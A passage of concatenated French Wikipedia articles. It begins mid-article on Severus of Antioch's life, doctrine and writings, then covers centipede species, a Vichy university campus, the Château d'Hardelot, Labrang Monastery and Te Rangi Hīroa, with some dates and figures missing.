La biographie de Zacharie est une apologie destinée à défendre Sévère des accusations qui furent portées contre lui par ses adversaires religieux au moment de son accession au patriarcat d'Antioche en 512 : on disait qu'il avait été un païen militant pendant ses années d'études, et qu'il avait notamment participé à des sacrifices clandestins à Beyrouth. Zacharie, qui fut son condisciple aussi bien à Alexandrie qu'à Beyrouth, s'inscrit en faux contre ces accusations et en appelle au témoignage de nombreux autres étudiants de l'époque encore vivants au moment de la rédaction de l'ouvrage. À l'époque de leurs études communes à Alexandrie, vers 485, les écoles de la ville furent le théâtre d'affrontements violents, qui étaient restés dans les mémoires, entre les chrétiens et des professeurs et étudiants fidèles au paganisme.
Au début surtout intéressé par ses études profanes, Sévère aurait été attiré par Zacharie, à Beyrouth, dans une association d'étudiants chrétiens constituée autour de l'ascète Évagre de Samosate. Il reçut finalement le baptême en l'église Saint-Léontios de Tripoli, Évagre étant son parrain. À la fin de ses études, il fit un pèlerinage à Émèse, où on vénérait la tête de saint Jean-Baptiste, puis à Jérusalem, et renonçant à s'établir comme avocat dans son pays natal, il revêtit l'habit monastique dans le couvent fondé à Maïouma, le port de Gaza, par l'évêque monophysite Pierre l'Ibère.
Quelque temps plus tard, Sévère quitta cet établissement et se retira en compagnie d'un autre moine nommé Anastase d'Édesse dans le désert d'Éleuthéropolis, entre Gaza et Jérusalem, pour s'y livrer dans la solitude à l'ascèse la plus rigoureuse, dont il garda ensuite des séquelles physiques. Recueilli en piteux état dans le monastère de l'abbé Romanos, situé dans la même région et réputé pour l'extrême sévérité de sa règle, il y séjourna un temps, puis retourna à Maïouma où il vécut dans une cellule de solitaire. Quand il reçut son héritage, il en consacra une partie à la fondation dans la même ville d'un monastère dont il devint le supérieur. C'est à cette époque qu'il fut ordonné prêtre par Épiphane, évêque monophysite de Magydos en Pamphylie, privé de son siège pour son opposition à l'Hénotique. Il se rattachait donc alors au courant des « Acéphales ».
À l'initiative notamment de Néphalios, un moine originaire d'Alexandrie, Sévère et ses compagnons furent accusés de monophysisme et chassés de leurs murs. Sévère se rendit à Constantinople en 508 avec 200 moines pour défendre sa cause devant l'empereur Anastase. Reçu par celui-ci grâce à de puissants appuis, il acquit un grand ascendant sur lui et resta dans la capitale jusqu'à la fin de l'année 511. Revenu en Orient pour assister au concile provincial de Sidon, Sévère fut finalement élevé au patriarcat d'Antioche après la déposition de Flavien II, soupçonné de nestorianisme, en 512 ; il fut intronisé le de cette année. Élie I, patriarche de Jérusalem, et d'autres évêques (dont les métropolites de Tyr, de Damas et de Bostra), refusèrent de le reconnaître. Cette élection, comme celle de Timothée au siège de Constantinople, signifia pour beaucoup le ralliement d'Anastase au monophysisme. 
Le patriarcat de Sévère ne dura que tant que vécut Anastase. Celui-ci, mort le , fut remplacé par Justin, partisan du concile de Chalcédoine, et Sévère, menacé d'arrestation par Irénée, comte de l'Orient, dut quitter Antioche dès le suivant pour se réfugier à Alexandrie, « place-forte » des monophysites. En 535, il retourna à Constantinople à l'invitation de Justinien et sympathisa notamment avec le patriarche Anthime, qui fut déposé pour monophysisme en mars 536, moins d'un an après son intronisation. Mennas, successeur d'Anthime, réunit un concile qui condamna Sévère, malgré l'appui que lui accorda toujours l'impératrice Théodora, qui l'avait rencontré dès le temps de son séjour en Égypte en 521. Arrêté malgré le sauf-conduit qu'il avait reçu, Sévère put s'échapper et retourner en Égypte grâce à l'impératrice. Il y finit sa vie hébergé par des sympathisants, n'ayant jamais pu regagner Antioche, mais il fut considéré jusqu'à sa mort comme le patriarche légitime de cette ville par de nombreux fidèles. Il fut inhumé dans le village monastique de l'Énaton, et son tombeau fut bientôt un lieu de pèlerinage et de culte.
Au moment de son baptême, il avait fait vœu de renoncer aux bains et de pratiquer le jeûne et les veilles, et il s'y tint toute sa vie. Quand il devint patriarche, il fit détruire les bains du palais patriarcal et renvoyer tous les cuisiniers. À la veille de sa mort, il refusa un bain dont on lui disait qu'il lui sauverait la vie, mais accepta finalement de se faire baigner avec tous ses vêtements. Pendant son patriarcat, il combattit avec constance l'existence de spectacles comme le théâtre et les courses de chars : l'une de ses homélies contient une dénonciation au ton très moderne de la cruauté subie par les chevaux dans les hippodromes. Il contribua fortement à l'abandon après 516 des Jeux olympiques célébrés à Antioche depuis l'an 41 (concours isolympique).
Outre la biographie déjà citée de Zacharie le Scholastique, une autre écrite du vivant de Sévère est due à Jean bar Aphthonia, « supérieur du monastère de Beith-Aphthonia ».
Doctrine.
Sévère s'attacha à suivre l'enseignement de Cyrille d'Alexandrie. Sa doctrine était totalement distincte de celle d'Eutychès, qu'il condamna explicitement. Avant 508, il rejetait l'Hénotique, mais l'accepta quand il devint patriarche d'Antioche (affirmant, dans un synode en 514, que cet édit annulait le concile de Chalcédoine) . Il tenait que Jésus-Christ avait une seule « nature divino-humaine » (φύσις θεανδρική), nature composée (φύσις σύνθετος), et il admettait la formule έκ δύο φύσεων (« venant de deux natures »). 
Suivant le rapport de l’évêque Bar-Hebraeus, il exposait ainsi sa doctrine :
À cette nature unique correspondaient pour lui des « activités (ou opérations) divino-humaines » (ένέργειαι θεανδρικαί), sans qu'on puisse distinguer les « activités divines » et les « activités humaines », comme dans la formulation des partisans du concile de Chalcédoine. Il attribuait aussi au Christ une seule volonté (monothélisme).
En 518, il retrouva à Alexandrie son ancien allié Julien d'Halicarnasse et s'opposa à lui sur la question de la corruptibilité du corps du Christ avant la Résurrection : les sévériens admettant cette corruptibilité (comme volontairement assumée, et non nécessitée par une nature humaine distincte) furent appelés Φθαρτολάτραι ou "Corrupticolae" par les julianistes ; inversement, ils accusèrent ceux-ci, tenants de l'incorruptibilité du corps du Christ, de verser dans le docétisme (Άφθαρτοδοκῆται). En 535, Théodose, disciple de Sévère, et Gaianos, disciple de Julien, se disputèrent le titre de patriarche d'Alexandrie.
Œuvre.
Sévère fut un écrivain abondant et n'écrivait qu'en grec. Mais à partir de 536, tous ses écrits furent voués au feu, et toute personne convaincue de les conserver pouvait avoir la main droite coupée. Il en résulte que seuls des fragments subsistent en langue grecque, mais beaucoup de textes, en revanche, ont été conservés en traduction syriaque. Un travail systématique de traduction de son œuvre en syriaque fut effectué de son vivant, entre 519 et 528, par son disciple syrien Paul de Callinicum. 
Il faut citer d'abord les textes de polémique doctrinale : le dialogue intitulé "Philalêtês" ("L'Ami de la vérité"), composé à Constantinople en 509-511 et dirigé contre les tenants du concile de Chalcédoine ; la controverse qui s'ensuivit avec un certain Jean le Grammairien de Césarée, qui avait composé une réponse (notamment la "Défense de Philalêtês" et le "Contre Jean le Grammairien", rédigé après 519) ; la correspondance avec Serge le Grammairien, datant des années 518-520, dans laquelle Sévère définit précisément et clairement sa doctrine face à un « monophysite » avec lequel il était en désaccord ; le corpus abondant lié à la polémique avec les julianistes.
Ensuite les sermons : ceux qu'il prononça comme patriarche d'Antioche sont connus sous le nom d"'Homélies cathédrales" et ont été préservés dans deux traductions syriaques différentes, celle de Paul de Callinicum et celle de Jacques d'Édesse. 125 sont publiés dans la collection "Patrologia Orientalis".
Sévère a également composé des hymnes, préservés dans une traduction syriaque de Paul d'Édesse (début du ) révisée par Jacques d'Édesse. L'ensemble de sa correspondance comprenait près de ; il en reste de très nombreux fragments, et plusieurs lettres entières inédites.
Sévère est peut-être l'auteur de la "Théosophie de Tübingen", un recueil d'oracles en grec. Ses textes apparaissent dans "CPG" 7022-7080.
Manichéisme.
La 132ème homélie de Sévère d'Antioche, contre les manichéens, uniquement préservée en syriaque, bien qu'originellement écrite en grec, est parmi les sources indirectes les plus riches sur le manichéisme . Cette homélie contient de très nombreuses citations d'un texte manichéen, depuis disparu. Originellement, il a été proposé que ce texte était le Livre des Géants. Cependant, depuis, des extraits du Livre des Géants ont été publiés et édités (notamment Henning 1943: "The Book of Giants" BSOAS, 52-74) et cette hypothèse semble improbable. Scopello (2001: 208), puis Gardner &amp; Lieu (2004: 160) ont proposé qu'il s'agissait en réalité de la Pragmateia mais cela est remis en doute par Baker-Brian 2011: 82-83: en effet, les citations de Sévère sont très différentes des citations de la Pragmateia par Théodore Bar Konai trois siècles plus tard. De plus, la Pragmateia est principalement un texte de légendes, alors que le texte cité par Sévère d'Antioche est un texte de théologie rationnelle. 
Kugener et Cumont ont traduit des extraits de la 132ème homélie, présentés avec le texte syriaque. L'aspect polémique est très présent dans cette homélie, qui ne se contente pas d'essayer de contredire et de rejeter les arguments théologiques manichéens, mais les appelle également les "très pervers Manichéens", "ces pervers": "Mais il est permis, semble-t-il, à ces pervers d'imaginer et de débiter vainement ces sottises et ces blasphèmes et (toutes ces choses) qui ne peuvent nullement être [...]". On est là très loin de Saint Augustin qui "s'adresse avec douceur à ses camarades d'antan" (manichéens).
Un des arguments importants de l'homélie de Sévère consiste à rejeter la possibilité que le principe du Bien et de la Lumière et celui du Mal et de la Matière soient tous les deux existant de toute éternité. Il explique notamment que la matière étant finie, le principe du mal, qui est également celui de la matière, ne peut être infini. Il cite le texte manichéen qui dit: "Chacun d'entre eux, en effet, est incréé et sans commencement, et le Bien qui est la Lumière et le Mal qui est à la fois les Ténèbres et la Matière, et ils n'ont rien de commun l'un avec l'autre", et commente: "Eh quoi ! Réponds à mes questions. Déclarerons-nous aussi que les deux principes sont infinis ? À ce qui est incréé et sans commencement appartient, en effet, nécessairement aussi l'infini. Et l'infini a comme propriété d'être incorporel. Et ce qui est incorporel est évidemment aussi intellectuel. Et comment n'est-il pas manifestement de la dernière folie de dire que la Matière est immatérielle et intellectuelle ? Et si tous les deux sont infinis et ne sont retenus nulle part, il est de toute nécessité que des choses tout à fait contraires et opposées et qui par nature ne s'accordent pas ensemble, se mélangent. Et dès lors il n'y a plus deux principes, mais un seul principe, mélangé et mêlé. [...]".

</doc>
<doc id="2846717" url="https://fr.wikipedia.org/wiki?curid=2846717" title="Lithobius delfossei">
Lithobius delfossei

Lithobius delfossei, la Lithobie de Delfosse, est une espèce d'arthropodes myriapodes de la famille des Lithobiidae et endémique de France.
Répartition et habitat.
Cette espèce a été redécouverte en France sur le terrain, après avoir été remarquée dans les collections du Muséum national d'histoire naturelle à Paris, dans les départements de l'Isère, des Hautes-Alpes et du Vaucluse. Elle a été trouvée en milieux sub-montagneux (mont Ventoux, montagne de Lure).
Description.
Iorio et Geoffroy indiquent que cette espèce mesure entre 9 et .
Dénomination.
Ce taxon porte en français le nom vernaculaire ou normalisé suivant : Lithobie de Delfosse.
Systématique.
Le nom valide complet (avec auteur) de ce taxon est "Lithobius delfossei" &amp; , 2007.
"Lithobius delfossei" a pour synonyme "Lithobius (Lithobius) delfossei".
Étymologie.
Son épithète spécifique, "delfossei", ainsi que son nom vernaculaire, « de Delfosse », lui ont été donnés en l'honneur de l'entomologiste français du MNHN, en remerciement de l'aide précieuse apportée aux auteurs dans leurs recherches.

</doc>
<doc id="2846722" url="https://fr.wikipedia.org/wiki?curid=2846722" title="Lithobius subtilis">
Lithobius subtilis

 est une espèce d'arthropode myriapode, classe des chilopodes, ordre des géophiles.
Liste des sous-espèces.
Lithobius subtilis geoffroyi.
Lithobius subtilis geoffroyi Iorio &amp; Berg, 2007 est une sous-espèce endémique, récemment découverte en France dans les départements des Alpes-de-Haute-Provence et du Vaucluse.
C'est une espèce qui a été redécouverte sur le terrain, après qu'on les a remarqués dans des collections du Muséum.
Un spécimen a été découvert en Isère.

</doc>
<doc id="2846726" url="https://fr.wikipedia.org/wiki?curid=2846726" title="Pôle universitaire et technologique Lardy">
Pôle universitaire et technologique Lardy

Le Pôle universitaire de Vichy est un campus de situé à proximité du centre-ville de Vichy, regroupant des infrastructures permettant l'accueil de formations de l'Université Clermont-Auvergne, filières variées, allant du DUT au master en passant par la licence. 
Il appartient à la communauté d'agglomération Vichy Communauté. 
Il est dirigé par Caroline Da Conceiçao .
Historique.
Le terrain était occupé entre 1937 et 1967 par des thermes. Les Bains Lardy furent inaugurés deux fois, le par Camille Chautemps, ministre d'État, puis le de la même année par Marc Rucart, ministre de la Santé publique.
La Compagnie fermière ferme définitivement l'établissement en 1967.
Réalisé entre 1995 et 2000, le terrain a été réaménagé afin de proposer :
Une partie des anciens bâtiments a été conservée et réhabilitée comme l'Orangerie devenue la médiathèque. Le bâtiment qui abritait la source publique est inscrit aux Monuments historiques.
Le pôle Lardy se compose de six parties distinctes :
En 2016, le pôle compte près de , dont 300 en première année commune aux études de santé (PACES).
Composantes et formations.
Le pôle propose plusieurs formations portées par l'Université Clermont Auvergne (UCA) 
Il assure les formations suivantes 
Programme affiché.
Les objectifs du Pôle sont de réunir sur un même site un ensemble de partenaires au service du développement socio-économique du bassin vichyssois et contribuant au développement de l'Auvergne, dans un lieu d'échanges et d'interactivité entre acteurs de la vie socio-économique locale et ceux de la formation et de la recherche, en s'appuyant sur les atouts existants : environnement et patrimoine locaux, notoriété de la ville, thermalisme, grands équipements culturels et sportifs, etc. et ceci, pour favoriser l'émergence de nouveaux axes de développement innovants.
Son programme se réclame de trois mots clés :

</doc>
<doc id="2846728" url="https://fr.wikipedia.org/wiki?curid=2846728" title="John McCabe">
John McCabe



</doc>
<doc id="2846731" url="https://fr.wikipedia.org/wiki?curid=2846731" title="C 4">
C 4



</doc>
<doc id="2846732" url="https://fr.wikipedia.org/wiki?curid=2846732" title="C.4">
C.4



</doc>
<doc id="2846738" url="https://fr.wikipedia.org/wiki?curid=2846738" title="Championnats d'Europe juniors d'athlétisme 2005">
Championnats d'Europe juniors d'athlétisme 2005

Les XVIII championnats d'Europe juniors d'athlétisme de 2005 ont été organisés à Kaunas en Lituanie du 21 au 24 juillet 2005, au stade S.-Darius-et-S.-Girėnas.
Pour les résultats détaillés, voir Championnats d'Europe juniors d'athlétisme 2005, résultats détaillés.

</doc>
<doc id="2846742" url="https://fr.wikipedia.org/wiki?curid=2846742" title="Benigno Andrade García">
Benigno Andrade García

Benigno Andrade García (né le au lieu-dit "As Foucellas", commune de Mesía en Galice (Espagne) et exécuté le dans la prison de La Corogne), est un militant de la Confédération nationale du travail et guérilléro anti-franquiste galicien sous le nom de O Foucellas. O Foucellas est un nom mythique et populaire encore aujourd'hui.
Biographie.
Né à As Foucellas, il a étudié à l'école locale et aidait aux travaux agricoles. Il a ensuite travaillé dans une mine de charbon à Fabero, Ponferrada, León. 
Marié à María Pérez, il a eu deux fils, Josefa et Sergio. Son épouse travaillait chez un médecin. Ce dernier, avec son épouse, Isabel Ríos Lozano, dirigeaient le groupe communiste à Curtis appelé "Sociedad Republicana Radio Comunista en Curtis", avec lequel Foucellas sympathise.
Il fait ensuite partie de la CNT. Au début de la Guerre Civile Espagnole il s'enrôle dans une colonne en partance pour La Corogne, mais la ville étant déjà envahie pour les forces putschistes, il rentre à Curtis.

</doc>
<doc id="2846744" url="https://fr.wikipedia.org/wiki?curid=2846744" title="Nicolas Desliens">
Nicolas Desliens

Nicolas Desliens est un cartographe français de la Renaissance. Il vécut au et collabora à l'école de cartographie de Dieppe.
Mappemondes connues.
La mappemonde de 1566, conservée à la Bibliothèque nationale de Paris, est une carte manuscrite sur parchemin en vélin, d'une dimension de x . Dans cette mappemonde, le sud est en haut du dessin. Il existe une copie de ce planisphère réalisée à la main par Henri Delachaux en 1884. 
La mappemonde de Nicolas Desliens représente en Afrique un fleuve unique, le Nil, avec un bras occidental nommé Niger. 
En Amérique du Nord est indiquée la « Nouvelle France occidentale » avec les symboles de la fleur de lys sur les territoires du Canada, du Labrador.
Une immense Terra Australis est représentée avec la légende « Jave la Grande ». Cette terre, reprenant les contours de l'Australie, est souvent représentée par les cartographes de l'école de cartographie de Dieppe, car nombreux sont les navigateurs portugais qui se sont rendus à Dieppe pour collaborer avec les cartographes français et leurs communiquer leurs connaissances maritimes.
Une autre mappemonde attribuée à Nicolas Desliens se trouve au Musée maritime de Greenwich.
Une rue « Nicolas Desliens » est située dans le quartier de la cité du marin sur la falaise est au dessus de l'avant port de Dieppe.
Un passage « Nicolas Desliens » est aussi situé à Dieppe...à la cité du marin.

</doc>
<doc id="2846745" url="https://fr.wikipedia.org/wiki?curid=2846745" title="Georges Guéril">
Georges Guéril

Georges Guéril né le , à Régina, en Guyane et décédé le à Cayenne, est un homme politique français.
Biographie.
Georges Guéril est né dans la commune de Régina, où vivent ses parents. Il obtient son baccalauréat au grand collège de Cayenne, puis un baccalauréat en droit en Martinique.
Il est résistant lors de la Seconde Guerre mondiale et, à la fin de la guerre, il est accueilli en fanfare, un grand "vidé" (cortège musical) rassemble toute la population du Maroni.
Il est élu sénateur de la Guyane en 1959, succédant ainsi à Hector Riviérez. Il siège dans le groupe UNR nouvellement formé, et participe aux travaux de la commission des affaires sociales. En 1962, en fin de mandat, il n'est pas réélu.
De 1965 à 1971, il est conseiller municipal de Cayenne.
Il était inspecteur central des Douanes et est enterré au cimetière de Cayenne.

</doc>
<doc id="2846747" url="https://fr.wikipedia.org/wiki?curid=2846747" title="Château d'Hardelot">
Château d'Hardelot

Le château d'Hardelot est un château fort situé dans la commune de Condette dans le Pas-de-Calais, en France. Le château actuel est un manoir achevé au milieu du , sur des fondations datant de 1222. Il a la forme d'un polygone avec neuf tours, entouré de deux larges fossés concentriques et installé sur une colline dominant les marécages et le lac des miroirs. Il est proche de la station balnéaire d'Hardelot-Plage, station à laquelle il a donné son nom.
Aujourd'hui, il abrite le "Centre culturel de l'Entente cordiale", consacré aux relations entre les Français et les Anglais, et accueille chaque été le "Midsummer Festival". Il est au centre de la réserve naturelle régionale du marais de Condette.
Géographie.
Le château d'Hardelot est situé dans le Boulonnais, au hameau d'Hardelot, dans le village de Condette, à l'ouest du village et à proximité immédiate de la station d'Hardelot-Plage, qui, elle, dépend de la commune de Neufchâtel-Hardelot.
Le château est bâti à une altitude d'environ et s'élève, par une butte, de moins de au-dessus de celui du lac des miroirs.
Le château appartient à une vaste zone naturelle, au cœur de la réserve naturelle régionale du marais de Condette et entouré par la forêt et les dunes d'Écault au nord, et la forêt d'Hardelot au sud, qui renforcent l'intérêt touristique de cette zone.
Histoire.
Des origines à 1900.
Le premier château, alors appelé "château d’Ardrelo", est construit en bois par les comtes de Boulogne au . C'est là qu'en 1194, Renaud de Dammartin signe la première charte communale de Boulogne.
Le château actuel est construit par le comte Philippe Hurepel de Clermont, fils du roi Philippe Auguste, de 1222 en 1231. Prise, reprise, cette forteresse voit passer dans ses murs des troupes françaises, anglaises et bourguignonnes. En 1615, Marie de Médicis fait assiéger le château par le maréchal d'Ancre car il est alors occupé par les protestants. Il est alors largement détruit et une ferme prend place au milieu des ruines. Il reste encore aujourd'hui les courtines d'origine.
Les événements de 1789 n'affectent guère la paroisse de Condette en Boulonnois. Les quelque 380 habitants sont surtout préoccupés par l'invasion des sables de la côte. Le château est mis en vente comme bien national en 1791, et c'est le seigneur de Châteaubourg qui l'achète pour livres.
En 1820, le château est à nouveau vendu avec ses 880 hectares de dunes et de garennes qui vont jusqu'à la mer. Quelques années plus tard, dans l'espoir d'arrêter l'avancée du sable dans les terres, on entreprend les premières plantations de résineux. En 1848, le château est acquis par l'Anglais Sir John Hare, un magistrat de Bristol, qui tente de restaurer les ruines médiévales. C'est à cette époque que l'écrivain Charles Dickens vient régulièrement à Condette pour, notamment, vivre en toute discrétion sa liaison avec Ellen Ternan.
En 1865 le capitaine Henry Guy rachète le château et construit un manoir de style néo-Tudor au-dessus des souterrains du et d’une des tours les mieux conservées. Sa fille Helen Guy deviendra une célèbre compositrice en son temps sous le nom de « Guy d'Hardelot ».
Époque contemporaine.
En 1897, l'Anglais John Robinson Whitley achète, de concert avec plusieurs de ses amis, le château et ses dépendances (prairies, dunes, marais, bois, taillis et les étangs de la Claire-Eau). Le château devient alors le centre d’attraction de la région : golf, tennis, chasse, pêche, archerie, etc. Il participe à la création de la station balnéaire d'Hardelot pour attirer les mondains fortunés et les aristocrates de France et d'Angleterre. En 1910, plusieurs hôtels et restaurants s'établissent près du château. Pendant la Première Guerre mondiale, le château est à la disposition de l’armée britannique. En 1934, l’abbé Bouly, le curé de Condette et d'Hardelot, célèbre pour être le père de la radiesthésie, l’achète. Il est ensuite occupé par une congrégation de religieuses.
En 1979, le château sert de lieu de tournage pour "Tess", un film de Roman Polanski.
Il est cédé en 1987 à la commune de Condette qui confie les terres au Parc naturel régional du Boulonnais. En 2001, un bail emphytéotique de 50 ans est signé entre le Conseil Général du Pas-de-Calais et la commune de Condette afin d'y installer un centre culturel. Le conseil général du Pas-de-Calais entreprend en septembre 2007 un gigantesque chantier de rénovation après la découverte du mérule dans la charpente, les boiseries et les murs du château.
Le , le "Centre culturel de l'Entente cordiale" voit le jour. Ce projet est mis en place par le Conseil Général du Pas-de-Calais afin d'entretenir, avec le comté du Kent au Royaume-Uni, la fameuse « Entente cordiale ». Il développe une programmation culturelle de qualité autour de la culture britannique, à travers toutes les formes d’art (musique, arts plastiques, cinéma, littérature, patrimoine). Des expositions sont organisées : Louis Blériot (2009), Napoléon à la sauce anglaise (2010), Charles Dickens (2011), Camp du Drap d'Or et Renaissance du look (2012). En 2013 est présentée l'exposition De la plume à la bobine : costumer la littérature dont le commissariat est assuré par Benoît Grécourt, directeur général du château d'Hardelot - Centre culturel de l'Entente cordiale. Rassemblant près d'une cinquantaine de costumes de films issus de la littérature française et britannique, elle est la dernière exposition présentée dans le château alors vide de décors et de collections.
Chaque mois de juin est organisé le Midsummer Festival, un important festival de musique ancienne, baroque et classique dans le cadre d'un théâtre élisabéthain démontable, installé pour l'occasion aux pieds des remparts du château. Le directeur artistique, Sébastien Mahieuxe, y rassemble des artistes de renommée internationale. La soprano britannique Dame Felicity Lott en est la marraine.
En 2014, les intérieurs du château sont réaménagés pour créer une exposition permanente consacrée à l'histoire du château et des relations franco-britanniques. Les décors intérieurs, inspirés des demeures anglaises et françaises de la seconde moitié du , sont créés par l’architecte spécialiste des décors historiques Gaël Noblanc. Le mobilier présenté est en partie mis à disposition par le Mobilier national. Une collection d'œuvres d'art est constituée par le château d'Hardelot et complétée par des œuvres provenant des Musées du Louvre, de Boulogne-sur-Mer et de Saint-Omer. Le directeur, Benoît Grécourt et Stephen Clarke assurent le commissariat de l’exposition permanente. Des jardins d'inspiration Tudor sont créés à l'extérieur de l'enceinte médiévale. Ils sont l'œuvre des paysagistes Emmanuel de Quillacq et Christophe Laborde.
Le , la maquette du projet de théâtre élisabéthain, conçu par le cabinet de l'architecte Andrew Todd est présenté à la reine Élisabeth II à l'ambassade du Royaume-Uni à Paris par l'architecte, accompagné de Dominique Dupilet, président du département du Pas-de-Calais et Benoît Grécourt, directeur général du château. En juin 2016, le nouveau théâtre est inauguré. Situé dans le parc du château, il est entièrement en bois (mélèze, épicéa, chêne et bambous) et peut accueillir 352 spectateurs en mode conférence, 388 au maximum en mode « théâtre élisabéthain ». En 2017, il remporte le prix des WAN Awards du meilleur bâtiment en bois dans le monde.
L'intérieur du château a servi de décor en 2016 au film "Ma Loute" de Bruno Dumont.
Remeublement.
Le Mobilier national a déposé au château d'Hardelot 66 éléments de mobilier. Y figurent notamment une paire de jardinières provenant des collections de la duchesse de Berry, des meubles en palissandre provenant du ministère d'État sous Napoléon III et des bibliothèques Second Empire provenant des collections Rotschild. Le lot le plus important est une série de dix chaises à châssis anglaises datant du . Pour évoquer l'Entente cordiale entre la France et la Grande-Bretagne ont été mis en place des objets en rapport avec cette alliance : un buste de Napoléon III en marbre par Lefèvre-Deumier, un buste d'Émile Loubet en biscuit de Sèvres, une statuette également en biscuit de Sèvres représentant l'allégorie de la Paix par Alfred Boucher.
Architecture.
Le château est de style néo-Tudor, reprenant une tour médiévale et érigé au-dessus des souterrains du .

</doc>
<doc id="2846749" url="https://fr.wikipedia.org/wiki?curid=2846749" title="Zefilho">
Zefilho

Zé Filho Santana José de Sousa est un footballeur attaquant brésilien, né le .

</doc>
<doc id="2846750" url="https://fr.wikipedia.org/wiki?curid=2846750" title="Roseaux">
Roseaux



</doc>
<doc id="2846755" url="https://fr.wikipedia.org/wiki?curid=2846755" title="159e régiment d'infanterie de ligne">
159e régiment d'infanterie de ligne



</doc>
<doc id="2846758" url="https://fr.wikipedia.org/wiki?curid=2846758" title="Monastère de Labrang">
Monastère de Labrang

Le monastère de Labrang ou Labrang Tashi Khyil ( ; ) est l'un des six grands monastères de l'école Gelugpa du bouddhisme tibétain, dont le dalaï-lama et le panchen-lama sont les autorités spirituelles. Il est situé dans la ville de Xiahe dans la préfecture autonome tibétaine de Gannan de la province chinoise du Gansu, qui appartenait à l'ancienne province tibétaine traditionnelle de l'Amdo. Xiahe est situé à près de quatre heures de la ville de Lanzhou, la capitale du Gansu. Le monastère de Labrang est celui qui accueille le plus grand nombre de moines en dehors de la région autonome du Tibet
Historique.
Le monastère a été fondé en 1709 par le premier Jamyang Zhaypa (1648-1722), Ngawang Tsondru.
C'était l'un des monastères les plus importants mais il fut l'objet de terribles pillages et massacres au cours des rébellions goloks de 1917 à 1949.
Il y eut autrefois (en 1957) jusqu'à moines dans les résidences de Labrang. Les trois-quarts des moines étaient Tibétains. Les autres étaient surtout des Mongols de Mongolie, de Mongolie-Intérieure, du Kokonor, des Mongours d'Amdo septentrional, des Yugurs jaunes (yu-gur) du Gansu, des Mongols kalmyks du Xinjiang et des Chinois han.
Labrang a eu sous sa dépendance jusqu'à 138 monastères. Les autorités monastiques possédaient un immense domaine nomadique et agricole qui s'étendait sur une bonne partie du Gansu oriental et s'avançait dans le Sichuan septentrional et le Qinghai oriental.
À partir de la révolte en Amdo en 1958, le monastère a été fermé pendant douze ans par le gouvernement chinois. Il a été rouvert en 1970 pour le tourisme puis comme monastère fonctionnel par le lama en 1980.
Il abrite actuellement près de 500 moines. Bien qu'il ne soit plus que l'ombre de ce qu'il était aux plans politique et économique, le monastère exerce encore une influence importante dans l'Amdo.
Quelques semaines après les troubles au Tibet en 2008, la police fit une descente au monastère de Labrang, saisit des photos du dalaï-lama, des téléphones portables utilisés pour photographier la manifestation et arrêta 200 moines, trois moines étaient encore en prison en dont l'un aurait envoyé une vidéo aux États-Unis. A Xiahe, ville à majorité tibétaine du Gansu, des manifestants de , ont été jugés début . Selon le photographe Gilles Sabarié, les autorités chinoises ont renforcé les dispositifs d'éducation politique et des séances de rééducation conduisent les moines du monastère de Labrang à lire une forme d'éducation patriotique ou réforme de la pensée.
Plusieurs Tibétains se sont immolés par le feu dans le secteur de Labrang.
Description.
La ville de Xiahe compte des Tibétains (environ 70 % de la population), des Chinois hui (20 %) et des Chinois han (10 %). La région est surtout rurale et pastorale (élevage du yack et d'autres animaux).
Le complexe du monastère domine le village, situé plus au nord. Les murs blanchis à la chaux et les toits dorés représentent des caractéristiques architecturales de style tibétain.
Le monastère contient dix-huit salles d'assemblée, six instituts d'études, un stupa doré, un sutra de débat, et près de sutras.
Les enseignements des six collèges sont différents, certains se concentrant sur les sciences naturelles et d'autres sur la philosophie bouddhiste. Mais les différentes matières sont interdépendantes et s'expliquent mutuellement.

</doc>
<doc id="2846766" url="https://fr.wikipedia.org/wiki?curid=2846766" title="Te Rangi Hiroa">
Te Rangi Hiroa

Te Rangi Hīroa, ou Sir Peter Buck, né vers octobre 1877 et mort le , était un homme politique et anthropologue néo-zélandais. Il était membre de l'iwi maori Ngāti Mutunga.
Jeunesse et carrière médicale.
Fils unique de William Henry Buck et de Ngarongo-ki-tua, Peter Buck est né à Urenui, en Nouvelle-Zélande. Il était membre de l'iwi Ngati Mutunga, de Taranaki, de par sa mère maori. Les anciens de la tribu le renommèrent Te Rangi Hīroa, nom emprunté à un ancêtre renommé. Du côté de son père, il était de descendance anglaise et irlandaise. Il fut élevé principalement au sein de la communauté pakeha (blanche), mais sa mère et sa grand-tante Kapuakore lui enseignèrent l'amour des traditions et de la langue maori.
En 1896, il entra à l'école Te Aute, réputée pour avoir formé de nombreux dirigeants maoris de l'époque. En 1899, il intégra l'école de médecine de l'Université d'Otago. Il y effectua de longues et brillantes études et y fut également remarqué pour ses talents d'athlète; il fut champion de saut en longueur de l'université en 1900 et en 1903. Il fut le premier diplômé maori de cette université.
Il s'associa au "Young Māori Party", une association plutôt qu'un parti politique, destinée à la promotion des intérêts des Maori.
En 1905, il épousa Margaret Wilson, immigrée née en Irlande. Cette même année, il fut nommé spécialiste médical auprès des Maori de l'île du Nord, d'abord dans le sud de l'île puis dans le nord, sous les ordres de Maui Pomare. Ensemble, Pomare et Buck contribuèrent à améliorer les conditions sanitaires de petites communautés.
Carrière politique.
En 1909, il fut élu député et conserva son siège jusqu'en 1914. Il devint membre du Comité aux Affaires indigènes. Il s'intéressa aux peuples du Pacifique, et travailla brièvement comme officier médical aux îles Cook et à Niue. Il fut l'auteur de plusieurs ouvrages d'anthropologie et d'ethnologie ayant pour thème les sociétés polynésiennes.
Pendant la Première Guerre mondiale, il aida au recrutement d'un contingent de volontaires maori. Il rejoignit l'armée en tant que médecin. Il participa à la bataille des Dardanelles, et fut décoré de l'Ordre du Service distingué pour héroïsme. Il participa également aux combats en France et en Belgique.
De retour en Nouvelle-Zélande, il fut nommé Chef officier médical pour les Maori, puis, en 1921, directeur du Département d'hygiène maori au sein du Département de la santé du gouvernement.
Anthropologie.
En 1907, Peter Buck devient membre de la Polynesian Society, société savante pour l'étude de la Polynésie. Il s'attache aux théories de Stephenson Percy Smith, aujourd'hui discréditées, sur les origines du peuplement de la Nouvelle-Zélande.
